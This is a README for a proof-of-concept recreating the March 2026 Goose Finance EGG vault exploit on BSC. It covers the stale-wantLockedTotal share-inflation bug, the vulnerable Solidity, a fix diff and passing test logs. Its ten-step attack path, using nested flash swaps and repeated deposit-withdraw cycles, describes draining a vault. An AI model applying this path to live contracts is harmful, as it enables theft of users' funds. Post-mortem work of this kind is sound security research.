# 2026-03-Recreate-GooseFinance-EGG-Exploit
Recreate a POC from Goose Finance EGG exploit on BSC on 12 March 2026.

## KeyInfo

- Total Lost                        : ~8,400 USD

- Attacker                          : [0x1E959Ce51E70FF93278c470Bf05a0f09b3c850de](https://bscscan.com/address/0x1E959Ce51E70FF93278c470Bf05a0f09b3c850de)

- Attack Contract                   : [0xd7E9763D79Eb9011e518129c79455E7eA65e0Cbf](https://bscscan.com/address/0xd7E9763D79Eb9011e518129c79455E7eA65e0Cbf)

- Vulnerable Contract               :

  - [VaultChef](https://bscscan.com/address/0x3F648151f5D591718327aA27d2EE25edF1b435D8)
  - [StrategyGooseEGG](https://bscscan.com/address/0x09806632AAbc99ae43a8644f336F38f9F559B26B)

- Attack Tx                         : [0x86efdf5b45ee833e696be15bddf0b60f6c449f73a45e39edd4838d9ece316223](https://app.blocksec.com/phalcon/explorer/tx/bsc/0x86efdf5b45ee833e696be15bddf0b60f6c449f73a45e39edd4838d9ece316223)


## Root Cause

- Vulnerability name            : Reward inflation attack (VaultChef and StrategyGooseEgg)

- Protocol affected             : [Strategy Goose](https://bscscan.com/address/0x09806632AAbc99ae43a8644f336F38f9F559B26B) / Goose Finance

- Root cause                    : In `StrategyGooseEGG::_deposit()`, `wantLockedTotal` is updated AFTER `sharesAdded` is calculated. This means the first deposit uses a stale (lower) `wantLockedTotal` value, causing the attacker's shares to be over-inflated. On the subsequent withdraw, the inflated shares entitle the attacker to far more tokens than they deposited.

this `StrategyGooseEGG::_deposit()` is called from `VaultChef::deposit()` which the code is presented here:
```javascript
function deposit(uint256 _pid, uint256 _wantAmt) public nonReentrant {
        updatePool(_pid);
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][msg.sender];

        if (user.shares > 0) {
            uint256 pending = user.shares.mul(pool.accRewardsPerShare).div(1e12).sub(user.rewardDebt);
            if (pending > 0) {
                safeRewardTransfer(msg.sender, pending);
            }
        }
        if (_wantAmt > 0) {
            pool.want.safeTransferFrom(address(msg.sender), address(this), _wantAmt);
            pool.want.safeIncreaseAllowance(pool.strat, _wantAmt);
@>          uint256 sharesAdded = IStrategy(pool.strat).deposit(msg.sender, _wantAmt);
            require(sharesAdded > 0, "DEPOSIT FAILED");
            user.shares = user.shares.add(sharesAdded);
        }
        user.rewardDebt = user.shares.mul(pool.accRewardsPerShare).div(1e12);
        emit Deposit(msg.sender, _pid, _wantAmt);
    }
```

The root cause is from the Strategy Goose Egg `_deposit()` internal function below:
```javascript
function _deposit(address _userAddress, uint256 _wantAmt) internal returns (uint256){
        uint256 sharesAdded = _wantAmt;
        if (wantLockedTotal > 0) {
            sharesAdded = _wantAmt
            .mul(sharesTotal)
            .mul(entranceFeeFactor)
            .div(wantLockedTotal)
            .div(entranceFeeFactorMax);
        }
        sharesTotal = sharesTotal.add(sharesAdded);

@>      _farm();

        return sharesAdded;
    }
```

The `_deposit()` function calculate `sharesAdded` **BEFORE** the `wantLockedTotal` calculated which is calculated on `_farm()`
```javascript
    function farm() public nonReentrant {
            _farm();
        }

    function _farm() internal {
        uint256 wantAmt = IERC20(eggAddress).balanceOf(address(this));
        if (wantAmt == 0) return;

        wrapEgg(wantAmt);
        wantLockedTotal = wantLockedTotal.add(wantAmt);
        IERC20(wrappedEggAddress).safeIncreaseAllowance(gooseChef, wantAmt);
        IGooseMasterChef(gooseChef).deposit(pid, wantAmt);
    }
```

After the `sharesAdded` calculated using **stale** `wantLockedTotal`, when the attacker withdraw, it takes more then what they deposited.



- Broken invariant              : User can withdraw an amount that exceeds their original deposit amount.

- Attack path (step-by-step)    :
  1. Approve `VaultChef` to spend EGG
  2. Flash swap `AMOUNTSWAP1` EGG from `LP_BUSD_EGG` (PancakeSwap)
  3. Inside `pancakeCall` (0x1): flash swap `AMOUNTSWAP2` EGG from `LP_WBNB_EGG` (nested)
  4. Inside `pancakeCall` (0x2): `vaultChef.deposit(PID=60, amount)` — shares over-inflated due to stale `wantLockedTotal`
  5. `vaultChef.withdraw(PID=60, type(uint256).max)` — attacker drains ~90%+ of `StrategyGooseEGG` balance
  6. `vaultChef.deposit(PID=60, amount)` [2nd time] — repeat inflation
  7. `vaultChef.withdraw(PID=60, type(uint256).max)` [2nd time] — depletes remaining EGG balance
  8. Repay `LP_WBNB_EGG` flash swap
  9. Repay `LP_BUSD_EGG` flash swap
  10. Dump EGG → BUSD + WBNB, convert BUSD → WBNB, unwrap WBNB → BNB, transfer profit to EOA

- Prevention / mitigation       : Update `StrategyGooseEGG::_deposit()` to calculate `wantLockedTotal` **before** calculating `sharesAdded`, so the share price always reflects the true current state of the vault.

```diff
function _deposit(address _userAddress, uint256 _wantAmt) internal returns (uint256){
+       _farm();  

        uint256 sharesAdded = _wantAmt;
        if (wantLockedTotal > 0) {
            sharesAdded = _wantAmt
            .mul(sharesTotal)
            .mul(entranceFeeFactor)
            .div(wantLockedTotal)
            .div(entranceFeeFactorMax);
        }
        sharesTotal = sharesTotal.add(sharesAdded);

-       _farm();

        return sharesAdded;
    }
```


## Analysis

- Post-mortem : none

- Twitter     :
  - https://x.com/DefimonAlerts/status/2032836162046316868
  - https://x.com/clara_oracle/status/2032853478792433667


## Run the POC

To run the POC please copy the `GooseEgg_exploit.t.sol` file to your Foundry project `test` folder.
Don't forget to change your RPC URL too.

Then run it on terminal with this command:

```bash
forge test --mp test/2026-03/GooseEgg/GooseEgg_exploit.t.sol -vv
```


## Test Output

```bash
Ran 1 test for test/2026-03/GooseEgg/GooseEgg_exploit.t.sol:GooseEggExploit
[PASS] test_gooseEggExploit() (gas: 942338)
Logs:
  ------------------------------------------------------------------------
  [START ] EOA ATTACK BNB Balances: 0.009975000000000000
  ------------------------------------------------------------------------
  ------------------------------------------------------------------------
  [START ] Strategy Goose Egg Egg Balances: 3689861.478111647027651406
  ------------------------------------------------------------------------
  |
  1. Approving Vault Chef
  |
  2. FlashSwap EGG from 1st LP:  5070000000000000000000000
  |
  3. On pancakeCall do the FlashSwap EGG again on another LP:  5100000000000000000000000
  |
  4. On the second pancakeCall, the attack is begin, with deposit all the flashswap amount 10170000000000000000000000
  |
  5. After deposit, the attacker immidiately withdraw and already gain 90%++ of the strategy goose egg contract, current balance: 12593884246852374493680720
  |
  6. Attacker do the attack again which deposit -> withdraw, and deplted all the egg balances, current balances:  12826027417809687889073858
  |
  7. Attacker repay the flashSwap and dump all the EGG into WBNB and BUSD, and convert BUSD into WBNB
  |
  8. Finally, attacker convert all WBNB -> BNB and transfer it to the EOA
  |
  ------------------------------------------------------------------------
  [FINISH] EOA ATTACK BNB Balances: 13.052959678723299651
  ------------------------------------------------------------------------
  ------------------------------------------------------------------------
  [FINISH] Strategy Goose Egg Egg Balances: 0.000000000000000000
  ------------------------------------------------------------------------

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.00s (242.54ms CPU time)

Ran 1 test suite in 3.00s (3.00s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```